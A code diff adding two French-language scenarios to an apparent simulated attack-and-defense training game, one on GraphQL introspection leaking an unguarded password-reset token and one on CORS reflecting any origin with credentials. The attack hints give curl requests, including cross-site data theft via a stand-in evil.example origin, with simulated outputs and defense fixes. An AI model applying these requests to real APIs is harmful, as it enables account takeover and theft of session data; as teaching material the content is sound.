@@ -4277,6 +4277,151 @@ const SCENARIOS = [
     log.push({t:"[+] Bit SUID posé sur /bin/bash de l'hôte, hors de tout confinement.", cls:'ok'});
     return {log, success:true};
   }
+},
+
+/* ===================== 54. Introspection GraphQL & champ non protégé ===================== */
+{
+  id:'graphql-introspection-privilege-leak',
+  title:'Introspection GraphQL activée en production expose un champ administrateur non protégé',
+  category:'Applications web (introspection GraphQL)',
+  attack:{
+    who:'Vous incarnez bob, un utilisateur standard authentifié sur l\'API GraphQL de target-lab.',
+    desc:"L'API GraphQL de target-lab expose son introspection (`__schema`) en production, révélant l'intégralité du schéma — y compris un champ `resetToken` du type `User`, non documenté publiquement mais accessible sans la moindre vérification d'autorisation au niveau du champ.",
+    hints:[
+      "`curl http://api.target-lab/graphql -d '{\"query\":\"{__schema{types{name fields{name}}}}\"}'` révèle l'intégralité du schéma, y compris des champs jamais mentionnés dans la documentation publique de l'API.",
+      "Le champ `resetToken` du type `User` ressort de cette introspection : rien n'indique qu'un contrôle d'autorisation spécifique le protège, contrairement aux autres champs sensibles de ce type.",
+      "`curl http://api.target-lab/graphql -d '{\"query\":\"{user(id:1){email resetToken}}\"}'` interroge directement ce champ pour l'utilisateur admin (id 1) — sans jamais avoir eu besoin d'un droit d'administration pour le lire, alors même que la résolution du champ `email` sur ce même utilisateur exigerait normalement ce droit."
+    ]
+  },
+  defense:{
+    who:'Vous incarnez désormais l\'administrateur de l\'API chargé de corriger la faille.',
+    desc:"Ajoutez une vérification d'autorisation explicite sur le champ `resetToken`, réservée à l'utilisateur propriétaire du compte ou à un administrateur — l'introspection en elle-même n'est pas le problème, un champ sensible non protégé au niveau de la résolution l'est.",
+    hints:[
+      "Éditez `/etc/api/graphql-config.yml` avec `nano` et passez `resetTokenFieldGuarded` à `true`.",
+      "`verify` confirme que le champ `resetToken` est désormais protégé par un contrôle d'autorisation."
+    ]
+  },
+  makeVfs(){
+    return {
+      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc']},
+      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
+      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
+      '/etc':{type:'dir',perm:'755',owner:'root',children:['api']},
+      '/etc/api':{type:'dir',perm:'755',owner:'root',children:['graphql-config.yml']},
+      '/etc/api/graphql-config.yml':{type:'file',perm:'644',owner:'root',size:60,
+        content:"introspection: true\nresetTokenFieldGuarded: false\n"}
+    };
+  },
+  startUserAttack:'bob', startCwdAttack:'/home/bob',
+  exploitRules:[
+    { pattern:/^curl\s+http:\/\/api\.target-lab\/graphql\s+-d\s+'\{"query":"\{__schema\{types\{name\s+fields\{name\}\}\}\}"\}'$/, run(state, print){
+        state.flags = state.flags || {};
+        state.flags.schemaRevealed = true;
+        print('{"data":{"__schema":{"types":[{"name":"User","fields":[{"name":"id"},{"name":"email"},{"name":"resetToken"}]},{"name":"Query","fields":[{"name":"user"}]}]}}}', 'out');
+        print("[i] Le champ \"resetToken\" n'apparaît dans aucune documentation publique, mais l'introspection le révèle.", 'info');
+      }
+    },
+    { pattern:/^curl\s+http:\/\/api\.target-lab\/graphql\s+-d\s+'\{"query":"\{user\(id:1\)\{email\s+resetToken\}\}"\}'$/, run(state, print){
+        const guarded = /resetTokenFieldGuarded:\s*true/.test(state.vfs['/etc/api/graphql-config.yml'].content);
+        if(guarded){ print('{"errors":[{"message":"Not authorized to read field \\"resetToken\\" for this user"}]}', 'err'); return; }
+        state.flags = state.flags || {};
+        state.flags.tokenLeaked = true;
+        print('{"data":{"user":{"email":"admin@target-lab.local","resetToken":"a1c9f0-reset-93be2d"}}}', 'ok');
+        print("[+] Champ resetToken lu sans droit d'administration : réinitialisation du mot de passe admin possible.", 'ok');
+        print("FLAG{graphql_field_authorization_missing_resettoken}", 'flagline');
+      }
+    }
+  ],
+  attackCheck(state){ return state.flags && state.flags.tokenLeaked === true; },
+  defenseCheck(state){ return /resetTokenFieldGuarded:\s*true/.test(state.vfs['/etc/api/graphql-config.yml'].content); },
+  replay(state){
+    const log=[];
+    const guarded = /resetTokenFieldGuarded:\s*true/.test(state.vfs['/etc/api/graphql-config.yml'].content);
+    log.push({t:'$ curl http://api.target-lab/graphql -d \'{"query":"{user(id:1){email resetToken}}"}\'', cls:'prompt-line'});
+    if(guarded){
+      log.push({t:'{"errors":[{"message":"Not authorized to read field \\"resetToken\\"..."}]}', cls:'err'});
+      log.push({t:"[-] Le champ resetToken est désormais protégé : la faille est corrigée.", cls:'err'});
+      return {log, success:false};
+    }
+    log.push({t:'{"data":{"user":{"email":"admin@target-lab.local","resetToken":"a1c9f0-reset-93be2d"}}}', cls:'ok'});
+    log.push({t:"[+] Champ resetToken lu sans droit d'administration.", cls:'ok'});
+    return {log, success:true};
+  }
+},
+
+/* ===================== 55. CORS reflétant n'importe quelle origine avec identifiants ===================== */
+{
+  id:'cors-reflected-origin-credentials',
+  title:'CORS reflète n\'importe quelle origine avec les identifiants, permettant le vol de données cross-site',
+  category:'Applications web (CORS mal configuré)',
+  attack:{
+    who:'Vous incarnez bob, un attaquant ayant attiré un administrateur déjà connecté à target-lab sur une page qu\'il contrôle, `https://evil.example` (hors périmètre : comment la victime y a été attirée).',
+    desc:"L'API de target-lab répond à l'en-tête `Origin` de la requête en le reflétant tel quel dans `Access-Control-Allow-Origin`, tout en ajoutant `Access-Control-Allow-Credentials: true`. N'importe quel site tiers peut donc effectuer une requête authentifiée avec les cookies de session de la victime et lire la réponse — ce que la Same-Origin Policy est censée empêcher.",
+    hints:[
+      "`curl -i http://api.target-lab/profile -H 'Origin: https://evil.example' --cookie 'session=victim_admin_session'` simule la requête envoyée par le navigateur de la victime depuis le site attaquant : observez les en-têtes de la réponse.",
+      "La réponse contient `Access-Control-Allow-Origin: https://evil.example` (l'origine attaquante, reflétée telle quelle) et `Access-Control-Allow-Credentials: true` : rien n'empêche un script hébergé sur `evil.example` de lire cette réponse authentifiée.",
+      "`curl http://api.target-lab/profile -H 'Origin: https://evil.example' --cookie 'session=victim_admin_session'` récupère directement les données du profil administrateur — exactement ce qu'un `fetch(..., {credentials:'include'})` lancé depuis `evil.example` pourrait exfiltrer."
+    ]
+  },
+  defense:{
+    who:'Vous incarnez désormais l\'administrateur de l\'API chargé de corriger la faille.',
+    desc:"Remplacez la réflexion dynamique de l'origine par une liste blanche stricte des origines légitimes, sans casser les intégrations qui en ont réellement besoin.",
+    hints:[
+      "Éditez `/etc/api/cors-config.yml` avec `nano` et remplacez `allowed_origin: reflect` par `allowed_origin: https://app.target-lab`.",
+      "`verify` confirme que l'origine n'est plus reflétée dynamiquement."
+    ]
+  },
+  makeVfs(){
+    return {
+      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc']},
+      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
+      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
+      '/etc':{type:'dir',perm:'755',owner:'root',children:['api']},
+      '/etc/api':{type:'dir',perm:'755',owner:'root',children:['cors-config.yml']},
+      '/etc/api/cors-config.yml':{type:'file',perm:'644',owner:'root',size:60,
+        content:"allowed_origin: reflect\nallow_credentials: true\n"}
+    };
+  },
+  startUserAttack:'bob', startCwdAttack:'/home/bob',
+  exploitRules:[
+    { pattern:/^curl\s+-i\s+http:\/\/api\.target-lab\/profile\s+-H\s+'Origin:\s+https:\/\/evil\.example'\s+--cookie\s+'session=victim_admin_session'$/, run(state, print){
+        const reflect = /allowed_origin:\s*reflect/.test(state.vfs['/etc/api/cors-config.yml'].content);
+        if(!reflect){
+          print('HTTP/1.1 200 OK\nAccess-Control-Allow-Origin: https://app.target-lab\n(pas d\'en-tête Access-Control-Allow-Credentials pour cette origine)', 'out');
+          return;
+        }
+        state.flags = state.flags || {};
+        state.flags.corsConfirmed = true;
+        print('HTTP/1.1 200 OK\nAccess-Control-Allow-Origin: https://evil.example\nAccess-Control-Allow-Credentials: true', 'out');
+        print("[i] L'origine attaquante est reflétée telle quelle, avec les identifiants autorisés : la Same-Origin Policy ne protège plus rien ici.", 'info');
+      }
+    },
+    { pattern:/^curl\s+http:\/\/api\.target-lab\/profile\s+-H\s+'Origin:\s+https:\/\/evil\.example'\s+--cookie\s+'session=victim_admin_session'$/, run(state, print){
+        const reflect = /allowed_origin:\s*reflect/.test(state.vfs['/etc/api/cors-config.yml'].content);
+        if(!reflect){ print("Blocked by CORS policy: l'origine https://evil.example n'est pas dans la liste blanche.", 'err'); return; }
+        if(!state.flags || !state.flags.corsConfirmed){ print("Réponse reçue, mais sans confirmation préalable des en-têtes CORS.", 'err'); return; }
+        state.flags.profileStolen = true;
+        print('{"email":"admin@target-lab.local","role":"admin","apiKey":"sk_live_9f2a7c..."}', 'ok');
+        print("[+] Profil administrateur exfiltré depuis un site tiers, grâce à la réflexion CORS avec identifiants.", 'ok');
+        print("FLAG{cors_reflected_origin_credentials_theft}", 'flagline');
+      }
+    }
+  ],
+  attackCheck(state){ return state.flags && state.flags.profileStolen === true; },
+  defenseCheck(state){ return !/allowed_origin:\s*reflect/.test(state.vfs['/etc/api/cors-config.yml'].content); },
+  replay(state){
+    const log=[];
+    const reflect = /allowed_origin:\s*reflect/.test(state.vfs['/etc/api/cors-config.yml'].content);
+    log.push({t:"$ curl http://api.target-lab/profile -H 'Origin: https://evil.example' --cookie '...'", cls:'prompt-line'});
+    if(!reflect){
+      log.push({t:"Blocked by CORS policy: l'origine https://evil.example n'est pas dans la liste blanche.", cls:'err'});
+      log.push({t:"[-] L'origine n'est plus reflétée dynamiquement : la faille est corrigée.", cls:'err'});
+      return {log, success:false};
+    }
+    log.push({t:'{"email":"admin@target-lab.local","role":"admin","apiKey":"sk_live_9f2a7c..."}', cls:'ok'});
+    log.push({t:"[+] Profil administrateur exfiltré depuis un site tiers via la réflexion CORS.", cls:'ok'});
+    return {log, success:true};
+  }
 }
 
 ];
